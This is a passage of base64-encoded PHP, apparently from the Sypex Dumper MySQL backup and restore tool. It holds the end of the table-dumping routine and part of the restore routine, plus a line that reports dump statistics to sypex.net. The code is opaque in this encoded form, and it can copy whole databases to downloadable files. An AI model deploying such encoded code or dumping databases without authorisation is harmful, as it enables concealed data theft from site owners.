yk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFiaW5mb1skdGFibGVdID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmluZm9bJHRhYmxlXSA+ICRsaW1pdDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMCwgJHQgLyAkdGFiaW5mb1swXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGkgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiSU5TRVJUIElOVE8gYHskdGFibGV9YCBWQUxVRVMiKTsKICAgICAgICAgICAgd2hpbGUoKCRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSBgeyR0YWJsZX1gIExJTUlUIHskZnJvbX0sIHskbGltaXR9IikpICYmICgkdG90YWwgPSBteXNxbF9udW1fcm93cygkcmVzdWx0KSkpewogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfcm93KCRyZXN1bHQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpKys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdCsrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRrID0gMDsgJGsgPCAkZmllbGRzOyAkaysrKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE51bWVyaWNDb2x1bW5bJGtdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcm93WyRrXSA9IGlzc2V0KCRyb3dbJGtdKSA/ICRyb3dbJGtdIDogIk5VTEwiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyb3dbJGtdID0gaXNzZXQoJHJvd1ska10pID8gIiciIC4gbXlzcWxfZXNjYXBlX3N0cmluZygkcm93WyRrXSkgLiAiJyIgOiAiTlVMTCI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAoJGkgPT0gMSA/ICIiIDogIiwiKSAuICJcbigiIC4gaW1wbG9kZSgiLCAiLCAkcm93KSAuICIpIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGkgJSAkbGltaXQyID09IDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkdGFiaW5mb1skdGFibGVdLCAkdCAvICR0YWJpbmZvWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfZnJlZV9yZXN1bHQoJHJlc3VsdCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRvdGFsIDwgJGxpbWl0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZyb20gKz0gJGxpbWl0OwogICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiO1xuXG4iKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMSwgJHQgLyAkdGFiaW5mb1swXSk7fQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAkdGFiczsKICAgICAgICAgICAgICAgICR0aGlzLT5yZWNvcmRzID0gJHRhYmluZm9bMF07CiAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcCA9ICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gKiAxMCArICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXTsKICAgICAgICBlY2hvIHRwbF9zKDEsIDEpOwogICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgJHRoaXMtPmZuX2Nsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJCYWNrdXAgb2YgREI6IGB7JGRifWAgd2FzIGNyZWF0ZWQuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KDQsNC30LzQtdGAINCR0JQ6ICAgICAgICIgLiByb3VuZCgkdGhpcy0+c2l6ZSAvIDEwNDg1NzYsIDIpIC4gIiDQnNCRIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgJGZpbGVzaXplID0gcm91bmQoZmlsZXNpemUoUEFUSCAuICR0aGlzLT5maWxlbmFtZSkgLyAxMDQ4NTc2LCAyKSAuICIg0JzQkSI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJGaWxlIHNpemU6IHskZmlsZXNpemV9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KLQsNCx0LvQuNGGINC+0LHRgNCw0LHQvtGC0LDQvdC+OiB7JHRhYnN9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KHRgtGA0L7QuiDQvtCx0YDQsNCx0L7RgtCw0L3QvjogICAiIC4gZm5faW50KCR0YWJpbmZvWzBdKSwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyAiPFNDUklQVD53aXRoIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2F2ZScpKSB7c3R5bGUuZGlzcGxheSA9ICcnOyBpbm5lckhUTUwgPSAn0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsgKHskZmlsZXNpemV9KSc7IGhyZWYgPSAnIiAuIFVSTCAuICR0aGlzLT5maWxlbmFtZSAuICInOyB9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhY2snKS5kaXNhYmxlZCA9IDA7PC9TQ1JJUFQ+IjsKICAgICAgICAgICAgICAgIC8vINCf0LXRgNC10LTQsNGH0LAg0LTQsNC90L3Ri9GFINC00LvRjyDQs9C70L7QsdCw0LvRjNC90L7QuSDRgdGC0LDRgtC40YHRgtC40LrQuAogICAgICAgICAgICAgICAgaWYgKEdTKSBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdHUycpLnNyYyA9ICdodHRwOi8vc3lwZXgubmV0L2dzLnBocD9iPXskdGhpcy0+dGFic30seyR0aGlzLT5yZWNvcmRzfSx7JHRoaXMtPnNpemV9LHskdGhpcy0+Y29tcH0sMTA4Jzs8L1NDUklQVD4iOwoKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHJlc3RvcmUoKXsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBJRD1iYWNrIFRZUEU9YnV0dG9uIFZBTFVFPSfQktC10YDQvdGD0YLRjNGB0Y8nIERJU0FCTEVEIG9uQ2xpY2s9XCJoaXN0b3J5LmJhY2soKTtcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfcHJvY2Vzcygi0JLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQkdCUINC40Lcg0YDQtdC30LXRgNCy0L3QvtC5INC60L7Qv9C40LgiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMTsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddID0gaXNzZXQoJF9QT1NUWydkYl9yZXN0b3JlJ10pID8gJF9QT1NUWydkYl9yZXN0b3JlJ10gOiAnJzsKICAgICAgICAgICAgICAgICRmaWxlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ2ZpbGUnXSkgPyAkX1BPU1RbJ2ZpbGUnXSA6ICcnOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3NhdmUoKTsKICAgICAgICAgICAgICAgICRkYiA9ICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddOwoKICAgICAgICAgICAgICAgIGlmICghJGRiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkVycm9yISDQndC1INGD0LrQsNC30LDQvdCwINCx0LDQt9CwINC00LDQvdC90YvRhSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDb25uZWN0IHRvIERCIGB7JGRifWAuIik7CiAgICAgICAgICAgICAgICBteXNxbF9zZWxlY3RfZGIoJGRiKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtSDRg9C00LDQtdGC0YHRjyDQstGL0LHRgNCw0YLRjCDQsdCw0LfRgyDQtNCw0L3QvdGL0YUuPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwoKICAgICAgICAgICAgICAgIC8vINCe0L/RgNC10LTQtdC70LXQvdC40LUg0YTQvtGA0LzQsNGC0LAg0YTQsNC50LvQsAogICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiL14oLis/KVwuc3FsKFwuKGJ6MnxneikpPyQvIiwgJGZpbGUsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJG1hdGNoZXNbM10pICYmICRtYXRjaGVzWzNdID09ICdiejInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKGlzc2V0KCRtYXRjaGVzWzJdKSAmJiRtYXRjaGVzWzNdID09ICdneicpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAxOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9sZXZlbCddID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoUEFUSCAuICIveyRmaWxlfSIpKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQpNCw0LnQuyDQvdC1INC90LDQudC00LXQvSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KfRgtC10L3QuNC1INGE0LDQudC70LAgYHskZmlsZX1gLiIpOwogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSA9ICRtYXRjaGVzWzFdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQndC1INCy0YvQsdGA0LDQvSDRhNCw0LnQuyEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKHN0cl9yZXBlYXQoIi0iLCA2MCkpOwogICAgICAgICAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJGZpbGUsICJyIik7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9ICRzcWwgPSAkdGFibGUgPSAkaW5zZXJ0ID0gJyc7CiAgICAgICAgJGlzX3NrZCA9ICRxdWVyeV9sZW4gPSAkZXhlY3V0ZSA9ICRxID0kdCA9ICRpID0gJGFmZl9yb3dzID0gMDsKICAgICAgICAgICAgICAgICRsaW1pdCA9IDMwMDsKICAgICAgICAkaW5kZXggPSA0OwogICAgICAgICAgICAgICAgJHRhYnMgPSAwOwogICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAkaW5mbyA9IGFycmF5KCk7CgogICAgICAgICAgICAgICAgLy8g0KPRgdGC0LDQvdC+0LLQutCwINC60L7QtNC40YDQvtCy0LrQuCDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5teXNxbF92ZXJzaW9uID4gNDAxMDEgJiYgKENIQVJTRVQgIT0gJ2F1dG8nIHx8ICR0aGlzLT5mb3JjZWRfY2hhcnNldCkpIHsgLy8g0JrQvtC00LjRgNC+0LLQutCwINC/0L4g0YPQvNC+0LvRh9Cw0L3QuNGOLCDQtdGB0LvQuCDQsiDQtNCw0LzQv9C1INC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gImAuIiwgQ19XQVJOSU5HKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGxhc3Rfc2hvd2VkID0gJyc7CiAgICAgICAgICAgICAgICB3aGlsZSgoJHN0ciA9ICR0aGlzLT5mbl9yZWFkX3N0cigkZnApKSAhPT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHN0cikgfHwgcHJlZ19tYXRjaCgiL14oI3wtLSkvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISRpc19za2QgJiYgcHJlZ19tYXRjaCgiL14jU0tEMTAxXHwvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGluZm8gPSBleHBsb2RlKCJ8IiwgJHN0cik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAsICR0IC8gJGluZm9bNF0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzX3NrZCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcXVlcnlfbGVuICs9IHN0cmxlbigkc3RyKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGluc2VydCAmJiBwcmVnX21hdGNoKCIvXihJTlNFUlQgSU5UTyBgPyhbXmAgXSspYD8gLio/VkFMVUVTKSguKikkL2kiLCAkc3RyLCAkbSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlICE9ICRtWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9ICRtWzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KLQsNCx0LvQuNGG0LAgYHskdGFibGV9YC4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsYXN0X3Nob3dlZCA9ICR0YWJsZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfc2tkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMTAwICwgJHQgLyAkaW5mb1s0XSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRpbnNlcnQgPSAkbVsxXSAuICcgJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICRtWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmRleCsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmZvWyRpbmRleF0gPSBpc3NldCgkaW5mb1skaW5kZXhdKSA/ICRpbmZvWyRpbmRleF0gOiAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsaW1pdCA9IHJvdW5kKCRpbmZvWyRpbmRleF0gLyAyMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxpbWl0ID0gJGxpbWl0IDwgMzAwID8gMzAwIDogJGxpbWl0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaW5mb1skaW5kZXhdID4gJGxpbWl0KXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJGNhY2hlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgLj0gJHN0cjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGluc2VydCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0Kys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc19za2QgJiYgJGluZm9bJGluZGV4XSA+ICRsaW1pdCAmJiAkdCAlICRsaW1pdCA9PSAwKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkaW5zZXJ0ICYmIHByZWdfbWF0Y2goIi9eQ1JFQVRFIFRBQkxFIChJRiBOT1QgRVhJU1RTICk/YD8oW15gIF0rKWA/L2kiLCAkc3RyLCAkbSkgJiYgJHRhYmxlICE9ICRtWzJdKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFibGUgPSAkbVsyXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW5zZXJ0ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXNfY3JlYXRlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzcWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvOyQvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9IHJ0cmltKCRpbnNlcnQgLiAkc3FsLCAiOyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRpbnNlcnQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA8IDQwMTAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi9FTkdJTkVccz89LyIsICJUWVBFPSIsICRzcWwpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAocHJlZ19tYXRjaCgiL0NSRUFURSBUQUJMRS9pIiwgJHNxbCkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vINCS0YvRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSsoXHcrKS9pIiwgJHNxbCwgJGNoYXJzZXQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5mb3JjZWRfY2hhcnNldCAmJiAkY2hhcnNldFsyXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDSEFSU0VUID09ICdhdXRvJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkY2hhcnNldFsyXSAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkY2hhcnNldFsyXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICRjaGFyc2V0WzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQotCw0LHQu9C40YbQsCBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJGNoYXJzZXRbMl0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyDQnNC10L3Rj9C10Lwg0LrQvtC00LjRgNC+0LLQutGDINC10YHQu9C4INGD0LrQsNC30LDQvdC+INGE0L7RgNGB0LjRgNC+0LLQsNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZvcmNlZF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oXC9cKiFcZCtccyk/KChDT0xMQVRFKVs9XHNdKylcdysoXHMrXCpcLyk/L2kiLCAnJywgJHNxbCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSspXHcrL2kiLCAiXFwxIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlLCAkc3FsKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKENIQVJTRVQgPT0gJ2F1dG8nKXsgLy8g0JLRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDQtNC70Y8g0YLQsNCx0LvQuNGGLCDQtdGB0LvQuCDQvtC90LAg0L3QtSDRg9C60LDQt9Cw0L3QsCDQuCDRg9GB0YLQsNC90L7QstC70LXQvdCwIGF1dG8g0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICcgREVGQVVMVCBDSEFSU0VUPScgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gJHRoaXMtPnJlc3RvcmVfY29sbGF0ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICE9ICRsYXN0X2NoYXJzZXQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyAnIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiJyIpIG9yIHRyaWdnZX